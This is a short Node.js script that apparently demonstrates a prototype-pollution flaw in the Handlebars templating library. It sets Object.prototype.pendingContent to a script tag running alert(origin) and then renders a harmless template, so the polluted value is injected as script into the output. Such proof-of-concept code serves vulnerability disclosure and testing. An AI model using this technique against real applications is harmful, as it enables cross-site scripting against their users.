const Handlebars = require('handlebars');

Object.prototype.pendingContent = `<script>alert(origin)</script>`

const source = `Hello {{ msg }}`;
const template = Handlebars.compile(source);

console.log(template({"msg": "posix"}));